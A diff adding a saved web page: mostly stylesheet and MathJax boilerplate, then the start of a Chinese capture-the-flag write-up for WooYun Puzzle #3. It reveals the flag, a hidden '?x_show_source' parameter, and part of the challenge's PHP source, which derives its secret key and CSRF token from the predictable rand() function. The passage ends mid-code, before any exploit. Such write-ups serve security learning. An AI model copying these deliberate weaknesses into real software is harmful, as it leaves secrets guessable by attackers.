+    inset 0 4px 12px rgba(255, 255, 255, .7),
+    inset 0 -12px 0 rgba(0, 0, 0, .05);
+}
+
+/* Multimarkdown Critic Blocks */
+.markdown-body .critic_mark {
+  background: #ff0;
+}
+
+.markdown-body .critic_delete {
+  color: #c82829;
+  text-decoration: line-through;
+}
+
+.markdown-body .critic_insert {
+  color: #718c00 ;
+  text-decoration: underline;
+}
+
+.markdown-body .critic_comment {
+  color: #8e908c;
+  font-style: italic;
+}
+
+.markdown-body .headeranchor {
+  font: normal normal 16px octicons-anchor;
+  line-height: 1;
+  display: inline-block;
+  text-decoration: none;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+.headeranchor:before {
+  content: '\f05c';
+}
+
+.markdown-body .task-list-item {
+  list-style-type: none;
+}
+
+.markdown-body .task-list-item+.task-list-item {
+  margin-top: 3px;
+}
+
+.markdown-body .task-list-item input {
+  margin: 0 4px 0.25em -20px;
+  vertical-align: middle;
+}
+
+/* Media */
+@media only screen and (min-width: 480px) {
+  .markdown-body {
+    font-size:14px;
+  }
+}
+
+@media only screen and (min-width: 768px) {
+  .markdown-body {
+    font-size:16px;
+  }
+}
+
+@media print {
+  .markdown-body * {
+    background: transparent !important;
+    color: black !important;
+    filter:none !important;
+    -ms-filter: none !important;
+  }
+
+  .markdown-body {
+    font-size:12pt;
+    max-width:100%;
+    outline:none;
+    border: 0;
+  }
+
+  .markdown-body a,
+  .markdown-body a:visited {
+    text-decoration: underline;
+  }
+
+  .markdown-body .headeranchor-link {
+    display: none;
+  }
+
+  .markdown-body a[href]:after {
+    content: " (" attr(href) ")";
+  }
+
+  .markdown-body abbr[title]:after {
+    content: " (" attr(title) ")";
+  }
+
+  .markdown-body .ir a:after,
+  .markdown-body a[href^="javascript:"]:after,
+  .markdown-body a[href^="#"]:after {
+    content: "";
+  }
+
+  .markdown-body pre {
+    white-space: pre;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+
+  .markdown-body pre,
+  .markdown-body blockquote {
+    border: 1px solid #999;
+    padding-right: 1em;
+    page-break-inside: avoid;
+  }
+
+  .markdown-body .progress,
+  .markdown-body .progress-bar {
+    -moz-box-shadow: none;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+  }
+
+  .markdown-body .progress {
+    border: 1px solid #ddd;
+  }
+
+  .markdown-body .progress-bar {
+    height: 22px;
+    border-right: 1px solid #ddd;
+  }
+
+  .markdown-body tr,
+  .markdown-body img {
+    page-break-inside: avoid;
+  }
+
+  .markdown-body img {
+    max-width: 100% !important;
+  }
+
+  .markdown-body p,
+  .markdown-body h2,
+  .markdown-body h3 {
+    orphans: 3;
+    widows: 3;
+  }
+
+  .markdown-body h2,
+  .markdown-body h3 {
+    page-break-after: avoid;
+  }
+}
+</style><style>/*github*/
+.codehilite {background-color:#fff;color:#333333;}
+.codehilite .hll {background-color:#ffffcc;}
+.codehilite .c{color:#999988;font-style:italic}
+.codehilite .err{color:#a61717;background-color:#e3d2d2}
+.codehilite .k{font-weight:bold}
+.codehilite .o{font-weight:bold}
+.codehilite .cm{color:#999988;font-style:italic}
+.codehilite .cp{color:#999999;font-weight:bold}
+.codehilite .c1{color:#999988;font-style:italic}
+.codehilite .cs{color:#999999;font-weight:bold;font-style:italic}
+.codehilite .gd{color:#000000;background-color:#ffdddd}
+.codehilite .ge{font-style:italic}
+.codehilite .gr{color:#aa0000}
+.codehilite .gh{color:#999999}
+.codehilite .gi{color:#000000;background-color:#ddffdd}
+.codehilite .go{color:#888888}
+.codehilite .gp{color:#555555}
+.codehilite .gs{font-weight:bold}
+.codehilite .gu{color:#800080;font-weight:bold}
+.codehilite .gt{color:#aa0000}
+.codehilite .kc{font-weight:bold}
+.codehilite .kd{font-weight:bold}
+.codehilite .kn{font-weight:bold}
+.codehilite .kp{font-weight:bold}
+.codehilite .kr{font-weight:bold}
+.codehilite .kt{color:#445588;font-weight:bold}
+.codehilite .m{color:#009999}
+.codehilite .s{color:#dd1144}
+.codehilite .n{color:#333333}
+.codehilite .na{color:teal}
+.codehilite .nb{color:#0086b3}
+.codehilite .nc{color:#445588;font-weight:bold}
+.codehilite .no{color:teal}
+.codehilite .ni{color:purple}
+.codehilite .ne{color:#990000;font-weight:bold}
+.codehilite .nf{color:#990000;font-weight:bold}
+.codehilite .nn{color:#555555}
+.codehilite .nt{color:navy}
+.codehilite .nv{color:teal}
+.codehilite .ow{font-weight:bold}
+.codehilite .w{color:#bbbbbb}
+.codehilite .mf{color:#009999}
+.codehilite .mh{color:#009999}
+.codehilite .mi{color:#009999}
+.codehilite .mo{color:#009999}
+.codehilite .sb{color:#dd1144}
+.codehilite .sc{color:#dd1144}
+.codehilite .sd{color:#dd1144}
+.codehilite .s2{color:#dd1144}
+.codehilite .se{color:#dd1144}
+.codehilite .sh{color:#dd1144}
+.codehilite .si{color:#dd1144}
+.codehilite .sx{color:#dd1144}
+.codehilite .sr{color:#009926}
+.codehilite .s1{color:#dd1144}
+.codehilite .ss{color:#990073}
+.codehilite .bp{color:#999999}
+.codehilite .vc{color:teal}
+.codehilite .vg{color:teal}
+.codehilite .vi{color:teal}
+.codehilite .il{color:#009999}
+.codehilite .gc{color:#999;background-color:#EAF2F5}
+</style><script type="text/javascript" src="Larry_files/MathJax.js"></script>
+<script>
+MathJax.Hub.Config({
+  config: ["MMLorHTML.js"],
+  extensions: ["tex2jax.js"],
+  jax: ["input/TeX"],
+  tex2jax: {
+    inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+    displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
+    processEscapes: false
+  },
+  TeX: {
+    extensions: ["AMSmath.js", "AMSsymbols.js"],
+    TagSide: "right",
+    TagIndent: ".8em",
+    MultLineWidth: "85%",
+    equationNumbers: {
+      autoNumber: "AMS",
+    },
+    unicode: {
+      fonts: "STIXGeneral,'Arial Unicode MS'"
+    }
+  },
+  showProcessingMessages: false
+});
+</script>
+<title>Larry</title><style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
+.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
+.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
+.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
+</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_About.MathJax_MousePost {outline: none}
+.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 5px 0px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 5px; -webkit-border-radius: 5px; -moz-border-radius: 5px; -khtml-border-radius: 5px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+.MathJax_MenuItem {padding: 1px 2em; background: transparent}
+.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
+.MathJax_MenuActive .MathJax_MenuArrow {color: white}
+.MathJax_MenuArrow.RTL {left: .5em; right: auto}
+.MathJax_MenuCheck {position: absolute; left: .7em}
+.MathJax_MenuCheck.RTL {right: .7em; left: auto}
+.MathJax_MenuRadioCheck {position: absolute; left: .7em}
+.MathJax_MenuRadioCheck.RTL {right: .7em; left: auto}
+.MathJax_MenuLabel {padding: 1px 2em 3px 1.33em; font-style: italic}
+.MathJax_MenuRule {border-top: 1px solid #DDDDDD; margin: 4px 3px}
+.MathJax_MenuDisabled {color: GrayText}
+.MathJax_MenuActive {background-color: #606872; color: white}
+.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
+.MathJax_ContextMenu:focus {outline: none}
+.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
+#MathJax_AboutClose {top: .2em; right: .2em}
+.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
+.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
+.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
+.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_MenuClose:hover span {background-color: #CCC!important}
+.MathJax_MenuClose:hover:focus {outline: none}
+</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
+</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
+.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
+</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
+#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+</style><style type="text/css">.MathJax_Preview {color: #888}
+#MathJax_Message {position: fixed; left: 1px; bottom: 2px; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
+#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
+.MathJax_Error {color: #CC0000; font-style: italic}
+</style><style type="text/css">.MJXp-script {font-size: .8em}
+.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
+.MJXp-bold {font-weight: bold}
+.MJXp-italic {font-style: italic}
+.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-largeop {font-size: 150%}
+.MJXp-largeop.MJXp-int {vertical-align: -.2em}
+.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
+.MJXp-display {display: block; text-align: center; margin: 1em 0}
+.MJXp-math span {display: inline-block}
+.MJXp-box {display: block!important; text-align: center}
+.MJXp-box:after {content: " "}
+.MJXp-rule {display: block!important; margin-top: .1em}
+.MJXp-char {display: block!important}
+.MJXp-mo {margin: 0 .15em}
+.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
+.MJXp-denom {display: inline-table!important; width: 100%}
+.MJXp-denom > * {display: table-row!important}
+.MJXp-surd {vertical-align: top}
+.MJXp-surd > * {display: block!important}
+.MJXp-script-box > *  {display: table!important; height: 50%}
+.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
+.MJXp-script-box > *:last-child > * {vertical-align: bottom}
+.MJXp-script-box > * > * > * {display: block!important}
+.MJXp-mphantom {visibility: hidden}
+.MJXp-munderover {display: inline-table!important}
+.MJXp-over {display: inline-block!important; text-align: center}
+.MJXp-over > * {display: block!important}
+.MJXp-munderover > * {display: table-row!important}
+.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
+.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
+.MJXp-mtr {display: table-row!important}
+.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
+.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-mlabeledtr {display: table-row!important}
+.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
+.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
+.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
+.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
+.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
+.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
+.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
+.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
+.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
+.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
+.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
+.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
+</style><style type="text/css">.MathJax_Display {text-align: center; margin: 1em 0em; position: relative; display: block!important; text-indent: 0; max-width: none; max-height: none; min-width: 0; min-height: 0; width: 100%}
+.MathJax .merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
+.MathJax .MJX-monospace {font-family: monospace}
+.MathJax .MJX-sans-serif {font-family: sans-serif}
+#MathJax_Tooltip {background-color: InfoBackground; color: InfoText; border: 1px solid black; box-shadow: 2px 2px 5px #AAAAAA; -webkit-box-shadow: 2px 2px 5px #AAAAAA; -moz-box-shadow: 2px 2px 5px #AAAAAA; -khtml-box-shadow: 2px 2px 5px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true'); padding: 3px 4px; z-index: 401; position: absolute; left: 0; top: 0; width: auto; height: auto; display: none}
+.MathJax {display: inline; font-style: normal; font-weight: normal; line-height: normal; font-size: 100%; font-size-adjust: none; text-indent: 0; text-align: left; text-transform: none; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; direction: ltr; max-width: none; max-height: none; min-width: 0; min-height: 0; border: 0; padding: 0; margin: 0}
+.MathJax:focus, body :focus .MathJax {display: inline-table}
+.MathJax img, .MathJax nobr, .MathJax a {border: 0; padding: 0; margin: 0; max-width: none; max-height: none; min-width: 0; min-height: 0; vertical-align: 0; line-height: normal; text-decoration: none}
+img.MathJax_strut {border: 0!important; padding: 0!important; margin: 0!important; vertical-align: 0!important}
+.MathJax span {display: inline; position: static; border: 0; padding: 0; margin: 0; vertical-align: 0; line-height: normal; text-decoration: none}
+.MathJax nobr {white-space: nowrap!important}
+.MathJax img {display: inline!important; float: none!important}
+.MathJax * {transition: none; -webkit-transition: none; -moz-transition: none; -ms-transition: none; -o-transition: none}
+.MathJax_Processing {visibility: hidden; position: fixed; width: 0; height: 0; overflow: hidden}
+.MathJax_Processed {display: none!important}
+.MathJax_ExBox {display: block!important; overflow: hidden; width: 1px; height: 60ex; min-height: 0; max-height: none}
+.MathJax .MathJax_EmBox {display: block!important; overflow: hidden; width: 1px; height: 60em; min-height: 0; max-height: none}
+.MathJax .MathJax_HitBox {cursor: text; background: white; opacity: 0; filter: alpha(opacity=0)}
+.MathJax .MathJax_HitBox * {filter: none; opacity: 1; background: transparent}
+#MathJax_Tooltip * {filter: none; opacity: 1; background: transparent}
+@font-face {font-family: MathJax_Main; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_Main-Regular.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_Main-Regular.otf?rev=2.6.1') format('opentype')}
+@font-face {font-family: MathJax_Main; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_Main-Bold.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_Main-Bold.otf?rev=2.6.1') format('opentype'); font-weight: bold}
+@font-face {font-family: MathJax_Main; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_Main-Italic.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_Main-Italic.otf?rev=2.6.1') format('opentype'); font-style: italic}
+@font-face {font-family: MathJax_Math; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_Math-Italic.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_Math-Italic.otf?rev=2.6.1') format('opentype'); font-style: italic}
+@font-face {font-family: MathJax_Caligraphic; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_Caligraphic-Regular.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_Caligraphic-Regular.otf?rev=2.6.1') format('opentype')}
+@font-face {font-family: MathJax_Size1; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_Size1-Regular.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_Size1-Regular.otf?rev=2.6.1') format('opentype')}
+@font-face {font-family: MathJax_Size2; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_Size2-Regular.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_Size2-Regular.otf?rev=2.6.1') format('opentype')}
+@font-face {font-family: MathJax_Size3; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_Size3-Regular.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_Size3-Regular.otf?rev=2.6.1') format('opentype')}
+@font-face {font-family: MathJax_Size4; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_Size4-Regular.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_Size4-Regular.otf?rev=2.6.1') format('opentype')}
+.MathJax .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
+</style><style type="text/css">@font-face {font-family: MathJax_AMS; src: url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/woff/MathJax_AMS-Regular.woff?rev=2.6.1') format('woff'), url('https://cdn.mathjax.org/mathjax/2.6-latest/fonts/HTML-CSS/TeX/otf/MathJax_AMS-Regular.otf?rev=2.6.1') format('opentype')}
+</style></head><body><div style="visibility: hidden; overflow: hidden; position: absolute; top: 0px; height: 1px; width: auto; padding: 0px; border: 0px none; margin: 0px; text-align: left; text-indent: 0px; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal;"><div id="MathJax_Hidden"></div></div><div style="display: none;" id="MathJax_Message"></div><article class="markdown-body"><p>不插电 · WooYun Puzzle#3 Write up</p>
+<h1 id="0x00"><a name="user-content-0x00" href="#0x00" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x00 前言</h1>
+<hr>
+<p>先献上flag，以表正义（我有一颗世界和平的心）</p>
+<blockquote>
+<p>Congratulate you, flag is cb6afe419450c23f462159afb9976130</p>
+</blockquote>
+<p>很高兴能够参加这次WooYun Puzzle，从P师傅出的题目中学到些许东西，下面分三步来突破<a href="http://0dac0a717c3cf340e.jie.sangebaimao.com:82/">安全盒子的秘密</a></p>
+<h1 id="0x01"><a name="user-content-0x01" href="#0x01" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x01 引诱</h1>
+<hr>
+<p>题目伊始上来一个“安全盒子”，不清楚具体是什么鬼，先随便提交试试</p>
+<p><img alt="" src="Larry_files/1.png"></p>
+<p>提交后报错说权限拒绝，向这种摸不着头脑的猜测会有源码来告诉你具体逻辑，F12后发现访问源码方法<code>&lt;!-- ?x_show_source --&gt;</code>：</p>
+<p><img alt="" src="Larry_files/2.png"></p>
+<p>随机访问<code>http://0dac0a717c3cf340e.jie.sangebaimao.com:82/?x_show_source</code>后得到源码为：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+ 10
+ 11
+ 12
+ 13
+ 14
+ 15
+ 16
+ 17
+ 18
+ 19
+ 20
+ 21
+ 22
+ 23
+ 24
+ 25
+ 26
+ 27
+ 28
+ 29
+ 30
+ 31
+ 32
+ 33
+ 34
+ 35
+ 36
+ 37
+ 38
+ 39
+ 40
+ 41
+ 42
+ 43
+ 44
+ 45
+ 46
+ 47
+ 48
+ 49
+ 50
+ 51
+ 52
+ 53
+ 54
+ 55
+ 56
+ 57
+ 58
+ 59
+ 60
+ 61
+ 62
+ 63
+ 64
+ 65
+ 66
+ 67
+ 68
+ 69
+ 70
+ 71
+ 72
+ 73
+ 74
+ 75
+ 76
+ 77
+ 78
+ 79
+ 80
+ 81
+ 82
+ 83
+ 84
+ 85
+ 86
+ 87
+ 88
+ 89
+ 90
+ 91
+ 92
+ 93
+ 94
+ 95
+ 96
+ 97
+ 98
+ 99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155</pre></div></td><td class="code"><div class="codehilite"><pre><span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd"> * Created by PhpStorm.</span>
+<span class="sd"> * User: phithon</span>
+<span class="sd"> * Date: 16/6/8</span>
+<span class="sd"> * Time: 上午12:24</span>
+<span class="sd"> */</span>
+
+ <span class="c1">//控制报错显示源码</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s2">"display_errors"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x_show_source'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">//为每次会话开启session</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="c1">//根据rand_str()生成6位SECRET_KEY和16位CSRF_TOKEN</span>
+<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rand_str</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CSRF_TOKEN'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CSRF_TOKEN'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rand_str</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">//包含点，其中可能存在flag</span>
+<span class="k">include_once</span> <span class="s2">"flag.php"</span><span class="p">;</span>
+
+<span class="c1">//使用rand()函数随机生成指定长度字符串</span>
+<span class="k">function</span> <span class="nf">rand_str</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$rand</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="nv">$_str</span> <span class="o">=</span> <span class="s2">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$n</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_str</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="nv">$rand</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$_str</span><span class="p">{</span><span class="nv">$n</span><span class="p">};</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="nv">$rand</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">//对ajax的请求以json形式相应，否则直接转换成字符串输出</span>
+<span class="k">function</span> <span class="nf">output</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)</span>
+<span class="p">{</span>
